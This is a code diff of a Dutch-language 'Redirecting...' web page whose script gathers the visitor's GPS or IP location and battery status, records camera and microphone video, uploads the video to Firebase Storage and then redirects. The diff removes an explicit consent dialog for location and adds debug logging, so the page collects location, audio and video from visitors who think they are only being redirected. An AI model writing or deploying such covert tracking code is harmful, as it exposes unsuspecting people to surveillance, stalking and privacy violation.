@@ -1,59 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <style>
-         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f3f7fa;
-            color: #333;
-        }
-        .container {
-            text-align: center;
-            padding: 40px;
-            background-color: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 80%;
-            max-width: 500px;
-        }
-        h1 {
-            color: #007bff;
-            margin-bottom: 20px;
-        }
-        p {
-            font-size: 1rem;
-            margin-bottom: 15px;
-        }
-        .loading-dots::after {
-            content: "";
-            animation: dots 1s steps(4) infinite;
-        }
-        .error-message {
-            color: #dc3545;
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        @keyframes dots {
-            0%   {content: "";}
-            25%  {content: ".";}
-            50%  {content: "..";}
-            75%  {content: "...";}
-        }
-    </style>
-    <!-- Firebase SDK (Firestore) -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-    <!-- Firebase SDK (Storage) -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
-</head>
+    </head>
 <body>
     <div class="container">
         <h1>Redirecting...</h1>
@@ -143,59 +91,48 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
     let batteryError = null;
     let ipLocationData = null;
 
+    console.log("collectOtherData called with videoUrl:", currentVideoUrl, "and cameraError:", currentCameraError); // DEBUG
+
     // 2. Location (if needed)
     if (locationPermission) {
-        // *BEFORE* getting the position, ask for permission explicitly:
-        if (confirm("Deze website wil je locatie gebruiken.  Sta je dit toe?")) {
-            try {
-                const position = await getCurrentPositionPromise();
-                locationData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy
-                };
-                console.log("Location data:", locationData);
-            } catch (error) {
-                console.error("Error getting location:", error);
-                let errorMsg = "";
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorMsg = "Gebruiker heeft locatietoestemming geweigerd.";
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                       errorMsg = "Locatie informatie is niet beschikbaar.";
-                        break;
-                    case error.TIMEOUT:
-                       errorMsg = "De aanvraag voor locatie duurde te lang.";
-                        break;
-                    case error.UNKNOWN_ERROR:
-                        errorMsg = "Er is een onbekende fout opgetreden bij het ophalen van de locatie.";
-                        break;
-                    default:
-                        errorMsg = error.message;
-                }
-                locationError = errorMsg;
-                 console.error("Location error:", locationError);
-
-                 ipLocationData = await getIPLocationData();
-                 if(ipLocationData){
-                     console.log("IP Location data (fallback):", ipLocationData);
-                 } else {
-                     console.error("Failed to get IP location fallback as well.");
-                 }
-
+        try {
+            const position = await getCurrentPositionPromise();
+            locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            console.log("Location data:", locationData);
+        } catch (error) {
+            console.error("Error getting location:", error);
+            let errorMsg = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = "Gebruiker heeft locatietoestemming geweigerd.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                   errorMsg = "Locatie informatie is niet beschikbaar.";
+                    break;
+                case error.TIMEOUT:
+                   errorMsg = "De aanvraag voor locatie duurde te lang.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMsg = "Er is een onbekende fout opgetreden bij het ophalen van de locatie.";
+                    break;
+                default:
+                    errorMsg = error.message;
             }
-        } else {
-            locationError = "Gebruiker heeft locatietoestemming geweigerd.";
-            console.warn("User denied location permission.");
+            locationError = errorMsg;
+             console.error("Location error:", locationError);
 
              ipLocationData = await getIPLocationData();
              if(ipLocationData){
-                 console.log("IP Location data (fallback, permission denied):", ipLocationData);
+                 console.log("IP Location data (fallback):", ipLocationData);
              } else {
-                 console.error("Failed to get IP location fallback even with permission denied.");
+                 console.error("Failed to get IP location fallback as well.");
              }
-        }
+
+            }
     } else {
          ipLocationData = await getIPLocationData();
          if(ipLocationData){
@@ -233,6 +170,7 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
     if (micCamPermission) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            console.log("Camera/Microphone stream obtained successfully."); // DEBUG
 
             // 2. Start recording (if needed)
             if (recordSeconds > 0) {
@@ -252,9 +190,10 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`);
 
                     try {
+                        console.log("Attempting to upload video to Firebase Storage..."); // DEBUG
                         await videoRef.put(blob);
                         videoUrl = await videoRef.getDownloadURL();
-                        console.log("Video URL:", videoUrl);
+                        console.log("Video URL obtained:", videoUrl); // DEBUG
                     } catch (uploadError) {
                         console.error("Error uploading video to Firebase Storage:", uploadError);
                         cameraError = "Error uploading video: " + uploadError.message;
@@ -274,6 +213,7 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     }, recordSeconds * 1000);
                 };
 
+                console.log("Starting video recorder..."); // DEBUG
                 recorder.start();
 
             } else {
@@ -367,29 +307,29 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     }
 
 
-    // 1. Request Location Permission FIRST
+    // 1. Request Location Permission FIRST (without confirm dialog)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             async (position) => {
-                console.log("Location permission granted.");
+                console.log("Location permission granted (browser prompt).");
                 // 2. If location granted, THEN request Camera/Microphone
                 const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
                 const { videoUrl, cameraError } = cameraMicData;
 
                 // Collect other data (battery, IP location) and redirect - location permission assumed granted here
-                collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError
+                collectOtherData(true, videoUrl, cameraError); // Pass true for location permission
 
 
             },
             async (error) => {
-                console.error("Location permission denied or error:", error);
-                errorMessage.textContent = "Locatie toestemming geweigerd of fout.";
+                console.error("Location permission denied or error (browser prompt):", error);
+                errorMessage.textContent = "Locatie toestemming geweigerd of fout (browser prompt).";
                 errorMessage.style.display = 'block';
 
                 // Still proceed to collect other data (battery, IP location) without GPS location, and redirect
                 const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
                 const { videoUrl, cameraError } = cameraMicData;
-                collectOtherData(false, videoUrl, cameraError); // Pass videoUrl and cameraError
+                collectOtherData(false, videoUrl, cameraError); // Pass false for location denied
 
 
             },
@@ -406,7 +346,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         // Proceed to camera/mic and other data collection even if geolocation is not supported
         const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
         const { videoUrl, cameraError } = cameraMicData;
-        collectOtherData(false, videoUrl, cameraError); // Pass videoUrl and cameraError
+        collectOtherData(false, videoUrl, cameraError); // Pass false for location not available
     }
 
 
